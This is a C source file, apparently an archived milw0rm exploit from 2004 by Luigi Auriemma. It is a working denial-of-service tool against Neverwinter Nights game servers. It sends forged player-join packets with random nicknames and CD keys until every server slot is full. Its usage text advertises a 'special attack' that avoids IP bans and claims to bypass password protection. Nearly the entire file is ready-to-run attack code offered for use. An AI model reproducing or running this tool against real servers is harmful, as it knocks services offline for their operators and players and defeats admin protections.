@@ -1,0 +1,479 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+
+
+    #define close   closesocket
+    #define FIVESEC 5000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define FIVESEC 5
+#endif
+
+
+
+#define VER         "0.1"
+#define BUFFSZ      2048
+#define PORT        5121
+#define TIMEOUT     3
+#define NICKSZ      8   // if you modify here, you must modify pck1 too!
+
+#define SEND(x)     if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
+                      < 0) std_err(); \
+                    fputc('.', stdout);
+#define RECV        if(timeout(sd) < 0) { \
+                        fputs("\n" \
+                            "Error: socket timeout, no reply received\n" \
+                            "\n", stdout); \
+                        exit(1); \
+                    } \
+                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
+                    if(len < 0) std_err(); \
+                    fputc('.', stdout);
+
+
+
+int find_gamever(u_char *data, int len);
+int create_rand_string(u_char *data, int len, u_int tmp);
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer,
+                        peerl;
+    u_int       seed;
+    int         sd,
+                i,
+                len,
+                on = 1,
+                special   = 0,
+                info_only = 0,
+                ser_ver   = 0;
+    u_short     port = PORT;
+    u_char      buff[BUFFSZ],
+                query[] =
+                    "\xfe\xfd\x00\x00\x00\x00\x00\xff\x00\x00",
+                srvname[] =
+                    "BNES"
+                    "\x00\x14"
+                    "\x00",
+                info[] =
+                    "BNXI"
+                    "\x00\x14",
+                pck1[] =
+                    "BNCS"
+                    "\x00\x14"
+                    "\x10"
+                    "\x00\x00\x00\x00"  // 8062 = version
+                    "\x03\x00"
+                    "\x01"
+                    "\x00\x00\x00\x00"  // random
+                    "\x08" "abcdefgh"   // NICKSZ and nickname
+                    "\x08" "00000000",  // cd-key
+                pck2[] =
+                    "BNVS"
+                    "\x50\x03"
+                    "\x28" "0000000000000000000000000000000000000000"
+                    "\x28" "0000000000000000000000000000000000000000"
+                    "\x28" "0000000000000000000000000000000000000000"
+                    "\x20" "00000000000000000000000000000000"
+                    "\x20" "00000000000000000000000000000000";
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Neverwinter Nights special Fake Players DoS "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s [options] <host>\n"
+            "\n"
+            "Options:\n"
+            "-p PORT   server port (default %d)\n"
+            "-s        special attack, you will be able to consume all the server sockets\n"
+            "          simply sending less than 100 packets each time. This type of attack\n"
+            "          is useful because the admin cannot easily ban your IP and is fast.\n"
+            "          It is automatically enabled if the server is protected by password.\n"
+            "       -> This is the ONLY way to fill an internet server!!! Without this\n"
+            "          option you can fill only local servers!\n"
+            "-i        informations only, requests remote informations and exits\n"
+            "-v VER    server version, by default this tool automatically retrieves the\n"
+            "          exact remote version (needed for the attack)\n"
+            "\n"
+            " Works also versus servers protected by password without knowing the keyword!\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+    argc--;
+    for(i = 1; i < argc; i++) {
+        switch(argv[i][1]) {
+            case 'p': port = atoi(argv[++i]); break;
+            case 's': special = 1; break;
+            case 'i': info_only = 1; break;
+            case 'v': ser_ver = atoi(argv[++i]); break;
+            default: {
+                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
+                exit(1);
+            }
+        }
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    peer.sin_addr.s_addr  = resolv(argv[argc]);
+    peer.sin_port         = htons(port);
+    peer.sin_family       = AF_INET;
+
+    peerl.sin_addr.s_addr = INADDR_ANY;
+    peerl.sin_port        = htons(time(NULL));
+    peerl.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    fputs("- request informations:\n", stdout);
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    SEND(srvname);
+    RECV;
+    if(memcmp(buff, "BNER", 4)) {
+        fputs("\nError: bad reply from the server\n\n", stdout);
+        exit(1);
+    }
+    buff[buff[8] + 9] = 0x00;
+    printf("\n"
+        "  Server name                %s\n", buff + 9);
+
+    SEND(info);
+    RECV;
+    close(sd);
+
+    if(memcmp(buff, "BNXR", 4)) {
+        fputs("\nError: bad reply from the server\n\n", stdout);
+        exit(1);
+    }
+    buff[buff[19] + 20] = 0x00;
+    printf("\n"
+        "  Game port                  %d\n"
+        "  Player Password            %s\n"
+        "  Levels                     %d -> %d\n"
+        "  Players                    %d / %d\n"
+        "  Local Characters Allowed   %s\n"
+        "  Player vs Player           %s\n"
+        "  Players Pause Enabled      %s\n"
+        "  Only One Party             %s\n"
+        "  Enforce Legal Characters   %s\n"
+        "  Item Level Restrictions    %s\n"
+        "  Module                     %s\n"
+        "\n",
+        *(u_short *)(buff + 4),
+        buff[7] ? "on" : "off",
+        buff[8], buff[9],
+        buff[10], buff[11],
+        buff[12] ? "on" : "off",
+        buff[13] ? "party or full" : "none",
+        buff[14] ? "on" : "off",
+        buff[15] ? "on" : "off",
+        buff[16] ? "on" : "off",
+        buff[17] ? "on" : "off",
+        buff + 20);
+
+    if(info_only) return(0);
+
+    if(!ser_ver) {
+        fputs("- retrieve server version (needed!):\n", stdout);
+        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(sd < 0) std_err();
+        *(u_long *)(query + 3) = peer.sin_addr.s_addr;  // something random
+        SEND(query);
+        RECV;
+        close(sd);
+        ser_ver = find_gamever(buff, len);
+        if(ser_ver <= 0) {
+            fputs("\n"
+                "Error: no gamever field found, you must manually specify the server version\n"
+                "       with the -v option\n"
+                "\n", stdout);
+            exit(1);
+        }
+    }
+
+    printf("\n- server version             %d\n", ser_ver);
+    *(u_long *)(pck1 + 7) = ser_ver;
+
+    seed = time(NULL);
+
+    fputs("- start attack:\n", stdout);
+    for(;;) {
+        for(i = 0;; i++) {
+            if(special) printf("\n  Packet %d: ", i);
+              else fputs("\n  Player: ", stdout);
+
+            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+            if(sd < 0) std_err();
+
+            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
+              < 0) std_err();
+            peerl.sin_port++;
+            if(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl))
+              < 0) std_err();
+
+            *(u_long *)(pck1 + 14) = peerl.sin_port;
+            seed = create_rand_string(pck1 + 19, NICKSZ, seed);     // random nick
+            seed = create_rand_string(pck1 + 20 + NICKSZ, 8, seed); // random cd-key
+
+            SEND(pck1);
+            RECV;
+            if(buff[6] != 0x56) {
+                if(buff[7] == 5) {
+                    close(sd);
+                    break;
+                } else if(buff[7] == 2) {
+                    fputs("\nError: wrong version, server uses another version (check the -v option)\n\n", stdout);
+                    exit(1);
+                } else if(buff[7] == 6) {
+                    fputs("\nAlert: a player with a same name already exists, I wait 5 seconds and retry\n", stdout);
+                    close(sd);
+                    sleep(FIVESEC);
+                    continue;
+                } else if(buff[7] == 10) {
+                    fputs("\nError: you are banned on this server\n\n", stdout);
+                    exit(1);
+                } else if(buff[7] == 12) {
+                    fputs("\nError: your nickname contains wrong chars\n\n", stdout);
+                    exit(1);
+                } else if(buff[7] == 32) {
+                    fputs("- password protection, I bypass it", stdout);
+                    close(sd);
+                    continue;
+                } else {
+                    printf("\nError: the fake player has not been accepted (error %d)\n\n", buff[7]);
+                    exit(1);
+                }
+            }
+
+            if(special) {
+                close(sd);
+                continue;
+            }
+
+            RECV;
+
+            seed = create_rand_string(pck2 + 7,   40, seed);
+            seed = create_rand_string(pck2 + 48,  40, seed);
+            seed = create_rand_string(pck2 + 89,  40, seed);
+            seed = create_rand_string(pck2 + 130, 32, seed);
+            seed = create_rand_string(pck2 + 163, 32, seed);
+
+            SEND(pck2);
+            RECV;
+
+            if(!memcmp(buff, "BNVRR", 5)) {
+                fputs("\n"
+                    "Error: the player seems to have not been accepted.\n"
+                    "       Remember that you must use the special attack (-s option) to fill\n"
+                    "       internet servers!\n"
+                    "\n", stdout);
+            }
+
+            close(sd);
+        }
+
+        fputs("- server full", stdout);
+        sleep(FIVESEC);
+    }
+
+    return(0);
+}
+
+
+
+int find_gamever(u_char *data, int len) {
+    int     nt = 0,
+            ver = -1;
+    u_char  *p,
+            *limit;
+
+    limit = data + len;
+    data += 5;
+    while(data < limit) {
+        p = strchr(data, 0x00);
+        if(!p) break;
+        *p = 0x00;
+
+        if(!nt) {
+            if(!*data) break;
+            if(!strcmp(data, "gamever")) ver = 0;
+            nt++;
+        } else {
+            if(!ver) ver = atoi(data);
+            nt = 0;
+        }
+        data = p + 1;
+    }
+    return(ver);
+}
+
+
+
+int create_rand_string(u_char *data, int len, u_int tmp) {
+    if(!tmp) tmp++;
+    while(len--) {
+        tmp = (*data + tmp) % 62;
+        if(tmp <= 9) {
+            *data = tmp + '0';
+        } else if((tmp >= 10) && (tmp <= 35)) {
+            *data = (tmp - 10) + 'A';
+        } else {
+            *data = (tmp - 36) + 'a';
+        }
+        data++;
+    }
+    return(tmp << 1);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct hostent *hp;
+    u_long host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2004-12-01]
